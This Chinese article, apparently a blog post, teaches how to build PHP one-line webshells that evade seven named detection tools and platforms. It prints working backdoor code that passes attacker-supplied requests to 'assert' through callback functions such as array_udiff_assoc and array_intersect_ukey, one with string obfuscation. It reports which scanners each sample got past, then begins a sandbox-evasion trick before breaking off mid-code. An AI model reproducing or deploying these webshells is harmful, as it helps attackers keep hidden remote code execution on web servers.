## 0x00: 前言
一般的，利用能够执行系统命令、加载代码的函数，或者组合一些普通函数，完成一些高级间谍功能的网站后门的脚本，叫做Webshell。
本篇文章主要探讨关于PHP语言的Webshell检测工具和平台的绕过方法，实现能够绕过以下表格中7个主流(基本代表安全行业内PHP
Webshell检测的一流水平)专业工具和平台检测的PHP Webshell，构造出零提示、无警告、无法被检测到的一句话木马后门。
编号 | 名称 | 参考链接  
---|---|---  
1 | 网站 **安全狗** 网马查杀 |
2 | **D盾** Web查杀 |   
3 | **深信服** WebShellKillerTool |
4 | **BugScaner** killwebshell |   
5 | **河马专业版** 查杀Webshell |   
6 | **OpenRASP** WEBDIR+检测引擎 |   
7 | **深度学习模型** 检测PHP Webshell |   
研究期间做了大量的测试，限于篇幅和文章效果，在不影响阅读体验的情况下，部分测试过程和结果略去了。
## 0x01：Webshell后门
目前来讲，我把用纯php代码实现的Webshell后门(以下统称为"木马")，主要分为以下几类：
  * **单/少功能木马**
能完成写入文件、列目录、查看文件、执行一些系统命令等少量功能的Webshell。
  * **逻辑木马**
利用系统逻辑漏洞或构造特殊触发条件，绕过访问控制或执行特殊功能的Webshell。
  * **一句话木马**
可以在目标服务器上执行php代码，并和一些客户端(如菜刀、Cknife)进行交互的Webshell。
  * **多功能木马**
根据PHP语法，编写较多代码，并在服务器上执行，完成大量间谍功能的Webshell(大马)。
其中，一句话木马的原理如下图：
> 客户端将PHP代码使用特殊参数名(密码)，发送给放置在服务端上的一句话木马文件；
>
> 一句话木马脚本则在服务器上执行发来的PHP代码，然后将执行结果回传给客户端，客户端将结果解析并展示给操作者。
## 0x02：查杀现状研究
根据0x01的一句话木马原理，我们知道必须要在服务器上执行客户端发来的字符串形式的PHP代码。
脚本要将字符串(或文件流)当作PHP代码执行，目前主要会使用以下函数：
函数 | 说明  
---|---  
eval | PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行  
assert | PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数  
正则匹配类 | preg_replace/ mb_ereg_replace/preg_filter等  
文件包含类 | include/include_once/require/require_once/file_get_contents等  
本文为了好说明问题，统一将上面表中可以将字符串当作代码执行的函数临时起个名字，叫" **函数机** "。
不幸的是，但凡直接出现函数机，即便不是进行恶意操作，部分查杀软件也会产生警告，达不到我们的要求。
比如用D盾检测如下脚本：
然后，就需要方法来隐藏上面的函数机。但是随着攻防对抗的升级，较传统的字符串拆分、变形、进制转换、运算变换等躲避Webshell查杀的效果已经大大降低。
所以，经过调研和比较，本文选择了通过可以携带参数的PHP回调函数来创造后门的技术，来实现绕过检测软件的一句话木马后门。
拿出来曾经披露过的一个回调函数后门函数"register_shutdown_function"做测试，发现虽然D盾、深信服的工具没有发觉到"register_shutdown_function"加
"assert"的变形，但是安全狗还是察觉到了。
所以，有理由推测，有一个恶意函数库，凡是网络上披露过的可用作后门的回调函数，都可能在其中，而且很大概率上会被检测出来。
经过收集，发现网络上50多个 **已披露出来的** 可用作后门的回调函数和类中，有部分函数仍然可以用来绕过Webshell查杀软件。
## 0x03：查找可做后门的回调函数
去[PHP官网](http://php.net/manual/zh/)查阅函数手册，查找可以用作后门的PHP回调函数，根据实际经验，利用下面五个关键词，能提高查找到拥有后门潜质的PHP回调函数的效率：
##### 关键词一：callable
##### 关键词二：mixed $options
##### 关键词三：handler
##### 关键词四：callback
##### 关键词五：invoke
除此之外， **PHP扩展** 中也有些合适的回调函数，不过可能通用性不强，本文不做讨论。
## 0x04：绕过传统检测
先拿披露过的array_udiff_assoc()函数构造一个免杀一句话。
函数定义：
    array array_udiff_assoc ( array $array1 , array $array2 [, array $... ], callable $value_compare_func )
根据定义，可以构造代码：
    array_udiff_assoc(array("phpinfo();"), array(1), "assert");
继续构造适合客户端连接的一句话木马：
    = 5.4.0, PHP 7)
    *
    */
    $password = "LandGrey";
    array_udiff_assoc(array($_REQUEST[$password]), array(1), "assert");
    ?>
浏览器访问
`http://127.0.0.1/shell/test/test.php?LandGrey=phpinfo();`
Cknife添加目标`http://127.0.0.1/shell/test/test.php` 密码: LandGrey，可成功连接。
用查杀工具检测：只有故意放置的一个eval一句话被查出来。
bugscaner 在线查杀，通过
使用河马正式版在线查杀，通过
至此，我们 **已经绕过安全狗、D盾和深信服的客户端Webshell查杀和bugscaner、河马正式版的在线查杀** 。
可以发现，只需找一个网络上没有" **频繁出现** "或" **没有出现过** "回调函数， **稍加变形** ，即可绕过传统技术的检测。
再给一个"array_intersect_ukey"反调函数的免杀示例：
    = 5.4.0, PHP 7)
     *
     */
    $password = "LandGrey";
    $ch = explode(".","hello.ass.world.er.t");
    array_intersect_ukey(array($_REQUEST[$password] => 1), array(1), $ch[1].$ch[3].$ch[4]);
    ?>
## 0x05：突破 **OpenRASP** WebShell沙盒检测
接着用OpenRASP团队的WEBDIR+在线查杀平台，被查出来是后门
经过反复测试和观察，OpenRASP 团队的Webshell检测使用了动态监测技术，原理上应该是
**将脚本放在安全沙盒中执行，分析脚本行为、尝试触发脚本的后门动作等** 。不管混淆的脚本多厉害，使用了多巧妙的函数，试执行时基本都会被检测出来。
刚开始时，发现使用 **PHP脚本加密技术** ，可以有效绕过OpenRASP团队的WEBDIR+
Webshell检测服务。但加密动作太大，会被D盾或深信服的Webshell查杀软件警告，不仅不能实现零警告和无提示，人眼一看就会发现有问题，所以放弃了加密脚本这条路。
然后就陷入了一段时间的思索，这里给出一种基于免杀的回调函数， **利用信息不对称** 来绕过OpenRASP WEBDIR+平台检测的技术：
#### 利用重命名前后的脚本名不同
在检测几次后，观察发现WEBDIR+ 把上传文件都按照文件哈希值重名了
所示，猜测该平台是先将上传脚本重命名，然后再在沙盒中试执行检测Webshell。那么就可以利用一句话脚本文件名在重命名前后的差别，完成绕过。一段核心的绕过检测的木马代码示例如下：
    <?php